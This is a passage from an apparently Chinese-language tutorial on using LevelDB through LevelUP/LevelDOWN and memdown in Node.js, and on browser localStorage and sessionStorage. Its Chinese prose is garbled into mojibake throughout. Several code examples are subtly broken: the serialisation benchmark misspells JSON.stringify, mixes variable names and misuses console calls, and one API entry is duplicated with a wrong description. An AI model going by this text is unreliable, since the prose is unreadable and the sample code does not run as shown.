ä¹Ÿä¸æ˜¯å¤šçº¿ç¨‹çš„ï¼Œä¸æ”¯æŒä½¿ç”¨åŒä¸€ä¸ªåº•å±‚æ–‡ä»¶å­˜å‚¨çš„å¤šå®žä¾‹ï¼Œæ‰€ä»¥æ— æ³•è„±ç¦»ç¨‹åºçš„å°è£…åˆ†å¸ƒå¼ä½¿ç”¨ã€‚ LevelDB ä¸­çš„é”®æ˜¯æŒ‰å­—å…¸é¡ºåºæŽ’å¥½åºçš„ï¼Œå€¼æ˜¯ç”¨ Google çš„ Snappy åŽ‹ç¼©ç®—æ³•åŽ‹ç¼©è¿‡çš„ã€‚è·ŸRedis ä¹‹ç±»çš„å†…å­˜æ•°æ®åº“ä¸åŒï¼ŒLevelDB æ€»æ˜¯æŠŠæ•°æ®å†™åˆ°ç¡¬ç›˜ä¸Šï¼Œæ‰€ä»¥æ€»çš„æ•°æ®å®¹é‡ä¸å—æœºå™¨å†…å­˜çš„é™åˆ¶ã€‚ LevelDB åªæä¾›äº†å‡ ä¸ªä¸€çœ‹å°±æ˜Žç™½çš„æ“ä½œå‘½ä»¤ï¼šGetã€Putã€Del å’Œ Batchã€‚LevelDB è¿˜èƒ½ç”¨å¿«ç…§æ•èŽ·å½“å‰çš„æ•°æ®åº“çŠ¶æ€ï¼Œåˆ›å»ºèƒ½åœ¨æ•°æ®é›†ä¸Šå‰åŽç§»åŠ¨çš„åŒå‘å¾ªçŽ¯å™¨ã€‚åˆ›å»ºå¾ªçŽ¯å™¨ä¹Ÿä¼šéšå«ç€åˆ›å»ºå¿«ç…§ï¼ŒåŽç»­å†™æ“ä½œæ— æ³•æ”¹å˜å¾ªçŽ¯å™¨è§åˆ°çš„æ•°æ®ã€‚ LevelDB è¿˜å½¢æˆäº†ä¸€äº›æ”¯è„‰ï¼Œæ¼”åŒ–å‡ºäº†å…¶ä»–ä¸€äº›æ•°æ®åº“ã€‚ç”±äºŽæœ‰æ•°é‡ä¼—å¤šçš„æ”¯è„‰ï¼ŒLevelDBè‡ªèº«åè€Œå¯ä»¥å˜å¾—è¶Šæ¥è¶Šç®€å•ï¼š Facebook çš„ RocksDB Hyperdex çš„ HyperLevelDB Basho çš„ Riak Mojangï¼ˆMinecraft çš„åˆ›ä½œè€…ï¼‰çš„ leveldb-mcpe ç”¨äºŽæ¯”ç‰¹å¸é¡¹ç›®çš„ bitcoin/leveldb LevelUP ä¸Ž LevelDOWN Node ä¸­å¯¹ LevelDB æä¾›æ”¯æŒçš„æ˜¯ LevelUP å’Œ LevelDOWN åŒ…ã€‚LevelDOWN ç”¨ C++ç®€å•ç›´ç™½åœ°å°† LevelDB ç»‘å®šåˆ° Nodeä¸Šï¼Œæˆ‘ä»¬ä¸å¤ªå¯èƒ½ç›´æŽ¥è·Ÿå®ƒäº¤äº’ã€‚LevelUP å¯¹ LevelDOWN çš„ API åšäº†å°è£…ï¼Œä¸ºæˆ‘ä»¬æä¾›äº†æ›´æ–¹ä¾¿ã€ä¹Ÿæ›´ä¹ æƒ¯çš„ Node æŽ¥å£ã€‚LevelUP è¿˜å¢žåŠ äº†ä¸€äº›åŠŸèƒ½ï¼ŒåŒ…æ‹¬é”®/å€¼ç¼–ç ã€JSONã€ç­‰å¾…æ•°æ®åº“æ‰“å¼€çš„å†™ç¼“å­˜ï¼Œä»¥åŠå°† LevelDB å¾ªçŽ¯å™¨æŽ¥å£å°è£…åœ¨äº† Node æµä¸­ã€‚ å®‰è£…åœ¨ Node ç¨‹åºä¸­ä½¿ç”¨ LevelDB æœ€æ–¹ä¾¿çš„åœ°æ–¹å°±æ˜¯å®ƒæ˜¯åµŒå…¥å¼çš„ï¼šæ‰€æœ‰éœ€è¦çš„ä¸œè¥¿éƒ½å¯ä»¥ç”¨ npm å®‰è£…ã€‚ä¸éœ€è¦å®‰è£…ä»»ä½•é¢å¤–çš„è½¯ä»¶ã€‚ 1npm install level -S level åŒ…é‡Œå°è£…äº† LevelUP å’Œ LevelDOWNï¼Œæä¾›äº†é¢„å…ˆé…ç½®å¥½ç”¨ LevelDOWN åšåŽå°çš„LevelUP APIã€‚level æä¾›çš„ LevelUP API åœ¨ LevelUP çš„ä»‹ç»æ–‡ä»¶é‡Œ API æ¦‚è§ˆLevelDB å®¢æˆ·ç«¯å­˜å‚¨å’ŒèŽ·å–æ•°æ®çš„ä¸»è¦æ–¹å¼å¦‚ä¸‹ï¼š db.put(key,value,callback)â€”â€”å­˜å‚¨é”®å€¼å¯¹ db.get(key,callback)â€”â€”èŽ·å–æŒ‡å®šé”®çš„å€¼ db.del(key,callback)â€”â€”ç§»é™¤æŒ‡å®šé”®çš„å€¼ db.batch().write()â€”â€”æ‰§è¡ŒæŒ‡å®šé”®çš„å€¼ db.batch().write()â€”â€”æ‰§è¡Œæ‰¹å¤„ç† db.createKeyStream(options)â€”â€”åˆ›å»ºæ•°æ®åº“ä¸­é”®çš„æµ db.createValueStream(options)â€”â€”åˆ›å»ºæ•°æ®åº“ä¸­å€¼çš„æµ åˆå§‹åŒ–åˆå§‹åŒ– level éœ€è¦æä¾›ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„è·¯å¾„ï¼Œå¦‚æžœæŒ‡å®šçš„ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œäººä»¬ä¸€èˆ¬ä¼šç”¨ .db åšè¿™ä¸ªç›®å½•çš„åŽç¼€ã€‚ åˆå§‹åŒ– level æ•°æ®åº“ 1234const level = require('level')const db = level('./app.db', &#123; valueEncoding: 'json'&#125;); è°ƒç”¨è¿‡ levelï¼ˆï¼‰ åŽï¼Œè¿”å›žçš„ LevelUPå®žä¾‹å¯ä»¥é©¬ä¸ŠæŽ¥å—å‘½ä»¤ï¼Œä»¥åŒæ­¥æ–¹å¼æ‰§è¡Œã€‚åœ¨ LevelDB å­˜å‚¨æ‰“å¼€ä¹‹å‰å‘å‡ºçš„å‘½ä»¤ä¼šç¼“å­˜èµ·æ¥ï¼Œä¸€ç›´ç­‰åˆ°å­˜å‚¨æ‰“å¼€ã€‚ é”®/å€¼ç¼–ç å› ä¸º LevelDB ä¸­çš„é”®å’Œå€¼å¯ä»¥æ˜¯ä»»ä½•ç±»åž‹çš„æ•°æ®ï¼Œæ‰€ä»¥ç¨‹åºè¦è´Ÿè´£å¤„ç†æ•°æ®çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚å¯ä»¥å°† LevelUP é…ç½®ä¸ºç›´æŽ¥æ”¯æŒä¸‹é¢è¿™äº›æ•°æ®ç±»åž‹ï¼š utf8 json binary id hex ascii base64 ucs2 utf16le é”®/å€¼é»˜è®¤éƒ½æ˜¯ UTF-8 çš„å­—ç¬¦ä¸²ã€‚ä¸Šé¢ä»£ç ä¸­ï¼Œé”®ä»ç„¶æ˜¯ UTF-8 å­—ç¬¦ä¸²ï¼Œä½†å€¼æ˜¯ç”¨JSON ç¼–ç /è§£ç çš„ã€‚ç»è¿‡ JSON ç¼–ç åŽï¼Œåœ¨æŸç§ç¨‹åºä¸Šæ¥è®²ï¼Œå¯¹è±¡æˆ–æ•°ç»„è¿™æ ·çš„ç»“æž„åŒ–æ•°æ®çš„å­˜å‚¨å’ŒèŽ·å–éƒ½å¯ä»¥ç”¨ MongoDB é‚£æ ·çš„æ–‡æ¡£å­˜å‚¨ä¸€æ ·äº†ã€‚ä½†å¹¶ä¸åƒçœŸæ­£çš„æ–‡æ¡£å­˜å‚¨ï¼ŒLevelDB æ²¡æœ‰åŠžæ³•è¯»å–å€¼é‡Œé¢çš„é”®ï¼Œå€¼æ˜¯ä¸é€æ˜Žçš„ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥ç”¨è‡ªå·±å®šåˆ¶çš„ç¼–ç ï¼Œæ¯”å¦‚è¯´æƒ³ MessagePack è¿™æ ·çš„ç»“æž„åŒ–æ•°æ®å½¢æ€ã€‚ é”®/å€¼å¯¹çš„è¯»å†™æ ¸å¿ƒ API å¾ˆç®€å•ï¼šç”¨ put(key,value)å†™ï¼Œç”¨ get(key) è¯»ï¼Œç”¨ del(key)åˆ é™¤ã€‚ 1234567891011121314151617181920const level = require('level')const db = level('./app.db', &#123; valueEncoding: 'json'&#125;);const key = 'user';const value = &#123; name: 'Alice'&#125;db.put(key, value, err =&gt; &#123; if (err) throw err; db.get(key, (err, result) =&gt; &#123; if (err) throw err; console.log('got value:', value); db.del(key, (err) =&gt; &#123; if (err) throw err; console.log('value was deleted'); &#125;); &#125;);&#125;); å¦‚æžœæŠŠå€¼æ”¾åˆ°å·²ç»å­˜åœ¨çš„é”®ä¸Šï¼Œæ—§å€¼ä¼šè¢«è¦†ç›–ã€‚å½“è§†å›¾è¯»å–çš„é”®ä¸å­˜åœ¨æ—¶ä¼šå‘ç”Ÿé”™è¯¯ã€‚é”™è¯¯å¯¹è±¡çš„ç±»åž‹æ˜¯ NotFoundError,è¿˜æœ‰ä¸ªç‰¹æ®Šçš„å±žæ€§ err.notFound,å¯ä»¥æŠŠå®ƒè·Ÿå…¶ä»–é”™è¯¯åŒºåˆ†å¼€ã€‚å¤§éƒ¨åˆ†æ•°æ®åº“ä¸€èˆ¬ä¸ä¼šå°†å…¶ä½œä¸ºé”™è¯¯ï¼Œä½†å› ä¸º LevelDB æ²¡æœ‰æä¾›æ£€æŸ¥æŸä¸ªé”®æ˜¯å¦å­˜åœ¨çš„åœ°æ–¹ï¼Œæ‰€ä»¥ LevelUP éœ€è¦åŒºåˆ†ä¸å­˜åœ¨çš„å€¼å’Œæœªå®šä¹‰çš„å€¼ã€‚ä¸Ž get ä¸åŒï¼Œdel ä¸å­˜åœ¨çš„é”®ä¸ä¼šæŠ¥é”™ã€‚ 12345db.get('this-key-does-not-exist',(err,value)=&gt;&#123; if(err &amp;&amp; !err.notFound) throw err; if(err &amp;&amp; err.notFound) return console.log('Value was not found'); console.log('Value was found:',value);&#125;); æ‰€æœ‰çš„æ•°æ®è¯»å†™æ“ä½œéƒ½å¯ä»¥é€šè¿‡ä¸€ä¸ªå¯é€‰çš„å‚æ•°æ”¹å˜å½“å‰æ“ä½œçš„ç¼–ç ï¼Œ 1234567db.put(new Uint8Array([1, 2, 3]), '0xFF0099', options, (err) =&gt; &#123; if (err) throw err; db.get(new Uint8Array([1, 2, 3]), options, (err, value) =&gt; &#123; if (err) throw err; console.log(value); &#125;);&#125;); å¯æ’æ‹”çš„åŽå°æŠŠ LevelUP/LevelDOWN åˆ†å¼€è¿˜æœ‰ä¸ªå¥½å¤„ï¼ŒLevelUP å¯ä»¥ç”¨å…¶ä»–æ•°æ®åº“åšå­˜å‚¨åŽå°ã€‚æ‰€æœ‰èƒ½ç”¨ MemoDown API å°è£…çš„ä¸œè¥¿éƒ½å¯ä»¥å˜æˆ LevelUP çš„å­˜å‚¨åŽå°ï¼Œä»Žè€Œå…è®¸ä½ ç”¨å®Œå…¨ç›¸åŒçš„ API è·Ÿè¿™äº›æ•°æ®å­˜å‚¨äº¤äº’ã€‚ ä¸‹é¢è¿™äº›æ•°æ®åº“éƒ½å¯ä»¥åš LevelUP çš„å­˜å‚¨åŽå°ï¼š MySQL Redis MongoDB JSON æ–‡ä»¶ Google ç”µå­è¡¨æ ¼ AWS DynamoDB Windows Azure è¡¨å­˜å‚¨ æµè§ˆå™¨ Web å­˜å‚¨ï¼ˆIndexedDB/localStorageï¼‰ æ‹¥æœ‰äº†è¿™ç§å¯ä»¥è½»æ¾åˆ‡æ¢å­˜å‚¨ä»‹è´¨ï¼Œç”šè‡³å¯ä»¥ç¼–å†™è‡ªå·±çš„å­˜å‚¨åŽå°çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸€å¥—æ•°æ®åº“ API åº”å¯¹å„ç§æƒ…å†µå’ŒçŽ¯å¢ƒï¼Œç”¨ä¸€å¥—æ•°æ®åº“ API æŽŒæ¡ä¸€åˆ‡ã€‚ memdown æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„åŽå°ï¼Œå®ƒæŠŠå€¼éƒ½å­˜åœ¨å†…å­˜é‡Œï¼Œå°±åƒä½¿ç”¨å†…å­˜æ¨¡å¼çš„ SQLite ä¸€æ ·ï¼Œéžå¸¸é€‚åˆæ”¾åœ¨æµ‹è¯•çŽ¯å¢ƒé‡Œé™ä½Žæµ‹è¯•é…ç½®å’Œé‡ç½®çš„æˆæœ¬ã€‚ å®‰è£…ä¾èµ– 1npm i -S levelup memdown é€šè¿‡ LevelUP ä½¿ç”¨ memdown 12345678910const level = require('levelup')const memdown = require('memdown');// å¯¹äºŽ memdown æ¥è¯´ï¼Œè¿™é‡Œçš„è·¯å¾„å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒæ ¹æœ¬ä¸éœ€è¦ç¡¬ç›˜const db = level('./level-articles.db', &#123; keyEncoding: 'json', valueEncoding: 'json', // å”¯ä¸€çš„åŒºåˆ«æ˜¯å°†dbå‚æ•°è®¾å®šä¸º memdown db: memdown&#125;); ä¸Šé¢çš„ä¾‹å­ç”¨äº†ä¹‹å‰çš„ level åŒ…ï¼Œå› ä¸ºå®ƒåªæ˜¯ LevelUP çš„å°è£…ï¼Œä½†å¦‚æžœä½ ä¸æƒ³ç”¨ level ä¸­çš„ LevelDOWN ï¼Œå¯ä»¥ç›´æŽ¥ç”¨ LevelUP,ä»¥å…å› ä¸º LevelDOWN å½¢æˆäº†å¯¹ LevelDBçš„ä¾èµ–ã€‚ æ¨¡å—åŒ–æ•°æ®åº“ä¸‹é¢æ˜¯ä¸€äº›å¯ä»¥é€šè¿‡ npm åŒ…å®žçŽ°çš„ LevelDB æ¨¡å—åŒ–åŠŸèƒ½ï¼š åŽŸå­æ›´æ–° è‡ªå¢žé•¿çš„é”® åœ°å€ä½ç½®æŸ¥è¯¢ å®žæ—¶æ›´æ–°æµ LRU é€å‡º Map/reduce ä»»åŠ¡ ä¸»/ä¸»å¤åˆ¶ ä¸»/ä»Žå¤åˆ¶ SQL æŸ¥è¯¢ äºŒçº§ç´¢å¼• è§¦å‘å™¨ ç‰ˆæœ¬åŒ–æ•°æ® æ˜‚è´µçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–JSON æ“ä½œæ˜¯æ˜‚è´µçš„é˜»å¡žå¼æ“ä½œã€‚åœ¨è¿›ç¨‹å°†æ•°æ®è£…è¿› JSON ï¼Œæˆ–ä»Ž JSON ä¸­å–å‡ºæ•°æ®æ—¶ï¼Œæ ¹æœ¬åšä¸äº†åˆ«çš„äº‹æƒ…ã€‚å¤§å¤šæ•°åºåˆ—åŒ–æ ¼å¼éƒ½æ˜¯å¦‚æ­¤ã€‚æ‰€ä»¥åºåˆ—åŒ–æ“ä½œä¸€èˆ¬éƒ½æ˜¯ Web æœåŠ¡å™¨ä¸Šçš„ç“¶é¢ˆã€‚è¦æƒ³é™ä½Žå½±å“ï¼Œæœ€å¥½çš„æ–¹æ³•å°±æ˜¯å‡å°‘è¿™ç§æ“ä½œçš„é¢‘çŽ‡å’Œè¦å¤„ç†çš„æ•°æ®é‡ã€‚ æ”¹å˜åºåˆ—åŒ–æ ¼å¼ï¼ˆæ¯”å¦‚ MessagePack æˆ– Protocol Bufferï¼‰å¯èƒ½ä¼šåŠ å¿«å¤„ç†é€Ÿåº¦ï¼Œä½†åœ¨è€ƒè™‘æ”¹å˜åºåˆ—åŒ–ä¹‹å‰ï¼Œè¦å°½å¯èƒ½å…ˆé™ä½Žè´Ÿè½½å’Œä¼˜åŒ–åºåˆ—åŒ–/ååºåˆ—åŒ–æ­¥éª¤æ¥æ”¹å–„æ€§èƒ½ã€‚ JSON.stringify å’Œ JSON.parse æ˜¯åŽŸç”Ÿå‡½æ•°ã€‚å·²ç»å……åˆ†ä¼˜åŒ–è¿‡äº†ï¼Œä½†æ˜¯åœ¨éœ€è¦å¤„ç†ä»¥å…†å­—èŠ‚ä¸ºå•ä½çš„æ•°æ®æ—¶ï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“åž®æŽ‰ã€‚ä¸‹é¢ä¾‹å­æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– 10MB æ•°æ®çš„æ€§èƒ½è¡¨çŽ°ã€‚ 1234567891011121314const bytes = require('pretty-bytes');const obj = &#123;&#125;;for(let i = 0; i &lt; 20000; i++)&#123; obj[i] = &#123; [Math.random()]:Math.random &#125;&#125;console.log(''serialise'');const jsonString = JSON.stringfy(obj);console.timeEnd('serialise');console.log('Serialise Size:',byte(Buffer.byteLength(jsonstring)));console.log('Deserialise');const obj2 = JSON.parse(jsonString);console.log('deserialise'); åœ¨ä¸€å°è£…äº† Node 6.2.2 çš„ 2015 3.1GHZ Intel Core i7MacBook Pro ä¸Šï¼Œå¯¹è¿™å°†è¿‘ 10MB çš„æ•°æ®ï¼Œåºåˆ—åŒ–å‡ ä¹Žç”¨äº† 140 æ¯«ç§’ï¼Œååºåˆ—åŒ–ç”¨äº† 335 æ¯«ç§’ã€‚è¿™æ ·çš„è´Ÿè½½æ”¾åˆ° Web æœåŠ¡å™¨ä¸Šå°±æ˜¯åœºç¾éš¾ï¼Œå› ä¸ºè¿™äº›æ­¥éª¤æ˜¯é˜»å¡žå¼çš„ï¼Œåªèƒ½ä¸²è¡Œå¤„ç†ã€‚åœ¨åºåˆ—åŒ–æ—¶ï¼Œè¿™æ ·çš„æœåŠ¡å™¨æ¯ç§’å¤§æ¦‚åªèƒ½å¤„ç† 7 ä¸ªè¯·æ±‚ï¼Œååºåˆ—åŒ–æ—¶æ¯ç§’åªå¤„ç† 3 ä¸ª æµè§ˆå™¨å†…å­˜å‚¨Node é‡‡ç”¨çš„å¼‚æ­¥ç¼–ç¨‹æ¨¡åž‹å¯ä»¥é€‚ç”¨äºŽå¾ˆå¤šåœºæ™¯ï¼Œå› ä¸ºå¯¹å¤§å¤šæ•° Web ç¨‹åºæ¥è¯´ï¼Œæœ€å¤§çš„ç“¶é¢ˆå°±æ˜¯ I/O ã€‚æ‰€ä»¥åˆ©ç”¨å®¢æˆ·ç«¯æ•°æ®æ—¢å¯ä»¥é™ä½ŽæœåŠ¡å™¨è´Ÿè½½ï¼Œè¿˜å¯ä»¥æå‡ç”¨æˆ·ä½“éªŒï¼Œè¿™æ˜¯æ•ˆæžœæœ€æ˜¾è‘—çš„åšæ³•ï¼Œä¸ç”¨ç­‰ç€ç¨‹åºåœ¨ç½‘ä¸Šè·‘æ¥è·‘åŽ»å–æ•°æ®çš„ç”¨æˆ·ä¼šå¾ˆå¼€å¿ƒã€‚å®¢æˆ·ç«¯å­˜å‚¨è¿˜å¯ä»¥æé«˜ç¨‹åºçš„å¯ç”¨æ€§ï¼Œå› ä¸ºå³ä¾¿ç”¨æˆ·æˆ–è€…æœåŠ¡æŽ‰çº¿äº†ï¼Œç¨‹åºé‡Œæœ‰äº›åŠŸèƒ½è¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚ Web å­˜å‚¨ï¼šlocalStorage å’Œ sessionStorageWeb å­˜å‚¨å®šä¹‰äº†ç®€å•çš„é”®/å€¼å­˜å‚¨ï¼Œå…¶åœ¨å®¢æˆ·ç«¯å’Œç§»åŠ¨ç«¯æµè§ˆå™¨ä¸Šéƒ½æœ‰å¾ˆå¥½çš„æ”¯æŒã€‚åŸŸå¯ä»¥ç”¨ Web å­˜å‚¨åœ¨æµè§ˆå™¨é‡Œä¿å­˜ä¸€å®šé‡çš„æ•°æ®ï¼Œå³ä¾¿æ˜¯ç»è¿‡ç½‘ç«™åˆ·æ–°ã€æ ‡ç­¾é¡µå…³é—­ï¼Œç”šè‡³æµè§ˆå™¨å…³é—­åŽï¼Œè¿™äº›æ•°æ®ä»ç„¶å­˜å‚¨ã€‚Web å­˜å‚¨æ˜¯å®¢æˆ·ç«¯æŒä¹…åŒ–çš„é¦–é€‰ï¼Œç®€å•æœ´ç´ æ˜¯å®ƒçš„ä¼˜åŠ¿ã€‚ æœ‰ä¸¤ç§ Web å­˜å‚¨ API ,localStorage å’Œ sessionStorageã€‚sessionStorage çš„ API è·Ÿ localStorage ä¸€æ ·ï¼Œåªæ˜¯æŒä¹…åŒ–è¡Œä¸ºä¸åŒã€‚è™½ç„¶å®ƒä»¬å­˜å‚¨çš„æ•°æ®åœ¨é¡µé¢é‡æ–°åŠ è½½ä¹‹åŽéƒ½ä¼šå¾—åˆ°ä¿ç•™ï¼Œä½† sessionStorage æ•°æ®åªä¼šä¿ç•™åˆ°é¡µé¢ä¼šè¯ç»“æŸï¼ˆæ ‡ç­¾æˆ–æµè§ˆå™¨å…³é—­æ—¶ï¼‰ï¼Œå¹¶ä¸”ä¸èƒ½åœ¨ä¸åŒçš„æµè§ˆå™¨çª—å£ä¹‹é—´å…±äº«ã€‚ å¼€å‘ Web å­˜å‚¨API æ˜¯ä¸ºäº†å…‹æœæµè§ˆå™¨ cookie çš„é™åˆ¶ã€‚ç¡®åˆ‡åœ°è¯´ï¼Œcookie ä¸é€‚åˆåœ¨å¤šä¸ªæ´»åŠ¨æ ‡ç­¾é—´å…±äº«åŒä¸€åŸŸçš„æ•°æ®ã€‚å¦‚æžœç”¨æˆ·è¦è·¨åŸŸå¤šä¸ªæ ‡ç­¾å®Œæˆä¸€é¡¹ä»»åŠ¡ï¼Œå¯ä»¥ç”¨ sessionStorage ä¿å­˜è¿™äº›æ ‡ç­¾å…±äº«çš„çŠ¶æ€æ•°æ®ï¼Œä»Žè€ŒçœæŽ‰å› ç½‘ç»œä¼ è¾“å¸¦æ¥çš„å¼€é”€ã€‚ è¦ä¿ç•™è·¨è¶Šå¤šä¸ªä¼šè¯ã€æ ‡ç­¾å’Œçª—å£çš„é•¿æœŸæ•°æ®ï¼Œcookie ä¹Ÿä¸å¥½ç”¨ã€‚è®¾è®¡ localStorage å°±æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ã€‚ä¸åŒçš„æµè§ˆå™¨æœ‰ä¸åŒçš„æ•°æ®å­˜å‚¨ç©ºé—´ä¸Šé™ã€‚ç§»åŠ¨ç«¯æµè§ˆå™¨åªæœ‰ 5MB çš„å­˜å‚¨ç©ºé—´ã€‚ API æ¦‚è§ˆ localStorage API æä¾›çš„æ–¹æ³•åŒ…æ‹¬ï¼š localStorage.setItem(key,value)â€”â€”å­˜å‚¨é”®å€¼å¯¹ localStorage.getItem(key)â€”â€”èŽ·å–æŒ‡å®šé”®å¯¹åº”çš„å€¼ localStorage.removeItem(key)â€”â€”ç§»é™¤æŒ‡å®šé”®å¯¹åº”çš„å€¼ localStorage.clear()â€”â€”ç§»é™¤æ‰€æœ‰é”®å€¼å¯¹ localStorage.key(index)â€”â€”èŽ·å–æŒ‡å®šç´¢å¼•å¤„çš„å€¼ localStorage.lengthâ€”â€”localStorage ä¸­çš„é”®æ€»æ•° å€¼çš„è¯»å†™é”®å’Œå€¼åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æžœæä¾›çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè¢«å¼ºåˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚è¿™ç§è½¬æ¢ç”¨çš„ toStringã€‚ä¸ä¼šäº§ç”ŸJSON å­—ç¬¦ä¸²ã€‚æ‰€ä»¥å¯¹è±¡çš„åºåˆ—åŒ–ç»“æžœå°±æ˜¯ [object object]ã€‚å› ä¸ºè¦æƒ³åœ¨ Web å­˜å‚¨ä¸­å­˜æ”¾æ¯”è¾ƒå¤æ‚çš„æ•°æ®ç±»åž‹ï¼Œåªèƒ½è®©åº”ç”¨ç¨‹åºåšè½¬æ¢å¤„ç†ã€‚ä¸‹é¢æ˜¯åœ¨ localStorage ä¸­å­˜æ”¾ JSON çš„ä¾‹å­ã€‚ 12345678const examplePreferences = &#123; temperature: 'Celcius'&#125;// å†™æ—¶åºåˆ—åŒ–localStorage.setItem('perferences', JSON.stringify(examplePreferences));// è¯»å–æ—¶ååºåˆ—åŒ–const perferences = JSON.parse(localStorage.getItem('perferences'));console.log('Loaded preferences:', perferences); è®¿é—® Web å­˜å‚¨ä¸­çš„æ•°æ®æ˜¯åŒæ­¥æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´æ‰§è¡Œè¯»å†™æ“ä½œæ—¶ï¼ŒWeb å­˜å‚¨ä¼šé˜»å¡ž UI çº¿ç¨‹ï¼Œä½†å› ä¸º é€Ÿåº¦ç›¸å½“å¿«ï¼Œåœ¨å·¥ä½œè´Ÿè½½æ¯”è¾ƒå°æ—¶ï¼Œç”¨æˆ·å¯Ÿè§‰ä¸å‡ºæ¥è¿™ç§å˜åŒ–ã€‚ä½†æ˜¯ï¼Œè¿˜æ˜¯åº”è¯¥å°½é‡é¿å…è¿‡åº¦è¯»å†™ï¼Œå°¤å…¶è¦é¿å…å‡ºçŽ°å¤§é‡æ•°æ®çš„è¯»å†™æ“ä½œã€‚å¯æƒœ Web worker æ— æ³•è®¿é—® Web å­˜å‚¨ï¼Œæ‰€ä»¥æ‰€æœ‰è¯»å†™åªèƒ½åœ¨ä¸» UI çº¿ç¨‹ä¸­è¿›è¡Œã€‚ Web å­˜å‚¨ API æ²¡æœ‰æŸ¥è¯¢åŠŸèƒ½ï¼Œä¸èƒ½æŒ‰èŒƒå›´é€‰æ‹©é”®ï¼Œæˆ–è€…æœæŸ¥ç‰¹å®šçš„å€¼ï¼Œåªèƒ½é€šè¿‡é”®æ¥è®¿é—®æ•°æ®é¡¹ã€‚å¦‚æžœæƒ³è¦å®žçŽ°æœç´¢åŠŸèƒ½ï¼Œåªèƒ½è‡ªå·±ç»´æŠ¤ä¸€å¥—ç´¢å¼•ï¼Œæˆ–è€…æ•°æ®é›†éžå¸¸å°çš„è¯ï¼Œå¯ä»¥è¿›è¡Œå¾ªçŽ¯éåŽ†ï¼Œä¸‹é¢å°±æ˜¯å¯¹ localStorage ä¸­çš„æ‰€æœ‰é”®è¿›è¡Œå¾ªçŽ¯éåŽ† 12345678910111213141516function getAllKeys() &#123; return Object.keys(localStorage);&#125;function getAllKeysAndValues() &#123; return getAllKeys() .reduce((obj, str) =&gt; &#123; obj[str] = localStorage.getItem(str); return obj; &#125;, &#123;&#125;);&#125;// å¾—åˆ°æ‰€æœ‰çš„å€¼const allValues = getAllKeys().map(key =&gt; localStorage.getItem(key))// ä½œä¸ºå¯¹è±¡è¾“å‡ºconsole.log(getAllKeysAndValues()); è·Ÿå¤§å¤šæ•°é”®/å€¼å­˜å‚¨ä¸€æ ·ï¼ŒWeb å­˜å‚¨ä¸­çš„é”®ä¹Ÿåªæœ‰ä¸€ä¸ªå‘½åç©ºé—´ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬ä¸èƒ½åˆ†åˆ«ä¸º posts å’Œ comments åˆ›å»ºå„è‡ªçš„å­˜å‚¨ã€‚ä¸è¿‡å¯ä»¥é€šè¿‡ç»™é”®å¢žå‰ç¼€çš„æ–¹å¼åˆ›å»ºâ€˜å‘½åç©ºé—´â€™ï¼Œæ¯”å¦‚ä¸‹é¢çš„è¿™æ ·ï¼š 12localStorage.setItem(`/posts/$&#123;posts.id&#125;`, post);localStorage.setItem(`/comments/$&#123;comments.id&#125;`, comments); èŽ·å–æŸä¸ªå‘½åç©ºé—´ä¸­ä¸­çš„æ‰€æœ‰æ•°æ®ï¼š 12345function getNamespaceItems(namespace) &#123; return getAllKeys().filter(key =&gt; key.startsWith(namespace));&#125;console.log(getNamespaceItems('/exampleNamespace')); è¿™æ ·ä¼šå¾ªçŽ¯éåŽ† localStorage ä¸­æ‰€æœ‰çš„é”®ï¼Œæ‰€ä»¥å¦‚æžœæ•°æ®é¡¹æ¯”è¾ƒå¤šï¼Œè¦è€ƒè™‘ä¸€ä¸‹å¯¹æ€§èƒ½çš„å½±å“ã€‚å› ä¸º localStorage API æ˜¯æ°¸ä¸çš„ï¼Œæ‰€ä»¥ç”¨èµ·æ¥é™åˆ¶è¿˜æ˜¯æ¯”è¾ƒå¤šã€‚æ¯”å¦‚è¯´ï¼Œå¯¹äºŽé‚£äº›ä»¥ JSON åºåˆ—åŒ–æ•°æ®ä¸ºå‚æ•°ï¼Œå¹¶è¿”å›žç»“æžœä¹Ÿæ˜¯è¿™æ ·çš„æ•°æ®çš„å‡½æ•°ï¼Œä½ å¯èƒ½ä¼šç”¨ localStorage ç¼“å­˜è®°å¿†ï¼ˆmemoizeï¼‰å®ƒçš„ç»“æžœã€‚ ç”¨ localStorage æŒä¹…åŒ–è®°å¿† 1234567891011// ä»¥åŽè°ƒç”¨æ—¶å¦‚æžœå‚æ•°ç›¸åŒï¼Œå¯ä»¥ç›´æŽ¥è¿”å›žä¹‹å‰è®°ä½çš„ç»“æžœfunction memoizedExpensiveOperation(data) &#123; const key = `/memoized/$&#123;JSON.stringify(data)&#125;`; const memoizedResult = localStorage.getItem(key); if (memoizedResult !== null) return memoizedResult; // å®Œæˆé«˜æˆæœ¬å·¥ä½œ const result = expensiveWork(data); // å°†ç»“æžœä¿å­˜åˆ° localStorage ä¸­ï¼Œä»¥åŽå°±ä¸ç”¨å†æ¬¡è®¡ç®— localStorage.setItem(key, result); return result;&#125; ä¸è¿‡åªæœ‰æ“ä½œç‰¹åˆ«æ…¢çš„æ—¶å€™ï¼Œè®°ä½ç»“æžœçš„æ”¶ç›Šæ‰ä¼šå¤§äºŽåºåˆ—åŒ–/ååºåˆ—åŒ–å¤„ç†çš„å¼€é”€ï¼ˆæ¯”å¦‚åŠ å¯†ç®—æ³•ï¼‰ã€‚å› æ­¤æœ€å¥½ä½¿ç”¨ localStorage èŠ‚çœå› 